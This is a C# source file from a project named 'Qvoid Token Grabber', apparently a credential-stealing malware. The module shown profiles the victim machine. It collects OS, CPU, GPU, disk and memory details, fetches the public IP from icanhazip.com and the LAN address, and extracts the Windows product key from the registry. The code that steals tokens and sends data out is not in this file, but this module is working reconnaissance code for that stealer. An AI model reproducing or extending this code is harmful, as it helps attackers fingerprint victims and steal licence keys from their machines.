using Microsoft.Win32;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;

namespace Qvoid_Token_Grabber.Misc
{
    //Forked from some old GitHub project, this is the reason why this code is looks like shit.
    class Machine
    {
        static readonly string[] SizeSuffixes = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };

        public string osName = String.Empty;
        public string osArchitecture = String.Empty;
        public string osVersion = String.Empty;
        public string processName = String.Empty;
        public string gpuVideo = String.Empty;
        public string gpuVersion = String.Empty;

        public string diskDetails = String.Empty;
        public string pcMemory = String.Empty;

        public Machine()
        {
            OSInfo();
            ProcessorInfo();
            GPUInfo();
            Disk();
            Memory();
        }

        static string SizeSuffix(Int64 value)
        {
            if (value < 0) { return "-" + SizeSuffix(-value); }
            if (value == 0) { return "0.0 bytes"; }

            int mag = (int)Math.Log(value, 1024);
            decimal adjustedSize = (decimal)value / (1L << (mag * 10));

            return string.Format("{0:n1} {1}", adjustedSize, SizeSuffixes[mag]);
        }

        private void OSInfo()
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject managementObject in mos.Get())
            {
                if (managementObject["Caption"] != null)
                    osName = managementObject["Caption"].ToString();

                if (managementObject["OSArchitecture"] != null)
                    osArchitecture = managementObject["OSArchitecture"].ToString();

                if (managementObject["Version"] != null)
                    osVersion = managementObject["Version"].ToString();
            }
        }

        private void ProcessorInfo()
        {
            RegistryKey processor_name = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);

            if (processor_name != null)
                if (processor_name.GetValue("ProcessorNameString") != null)
                    processName = processor_name.GetValue("ProcessorNameString").ToString();
        }

        public static string GetPublicIpAddress()
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://icanhazip.com");
                return new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
            }
            catch { return "Error"; }
        }

        public static string GetLanIpv4Address()
        {
            IPHostEntry ipHostEntry = Dns.GetHostEntry(string.Empty);
            foreach (IPAddress address in ipHostEntry.AddressList)
                if (address.AddressFamily == AddressFamily.InterNetwork)
                    return address.ToString();

            return string.Empty;
        }

        private void GPUInfo()
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_VideoController");
            foreach (ManagementObject obj in mos.Get())
            {
                gpuVideo = obj["VideoProcessor"].ToString();
                gpuVersion = obj["DriverVersion"].ToString();
            }
        }

        private void Disk()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
                if (d.IsReady == true)
                    diskDetails += String.Format("Drive {0}\\ - {1}", d.Name, SizeSuffix(d.AvailableFreeSpace) + "/" + SizeSuffix(d.TotalSize) + "\\n");
        }

        private void Memory()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");

            Int64 Capacity = 0;
            foreach (ManagementObject WniPART in searcher.Get())
                Capacity += Convert.ToInt64(WniPART.Properties["Capacity"].Value);

            pcMemory = SizeSuffix(Capacity);
        }

    }

    class Windows
    {
        private static string ProductKey(byte[] digitalProductId)
        {
            var key = String.Empty;
            const int keyOffset = 52;
            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            var last = 0;
            for (var i = 24; i >= 0; i--)
            {
                var current = 0;
                for (var j = 14; j >= 0; j--)
                {
                    current = current * 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current = current % 24;
                    last = current;
                }
                key = digits[current] + key;
            }

            var keypart1 = key.Substring(1, last);
            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
            key = keypart1 + "N" + keypart2;

            for (var i = 5; i < key.Length; i += 6)
                key = key.Insert(i, "-");

            return key;
        }

        public static string GetProductKey()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);

            if (Environment.Is64BitOperatingSystem)
                localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[])registryKeyValue;

            return ProductKey(digitalProductId);
        }
    }
}
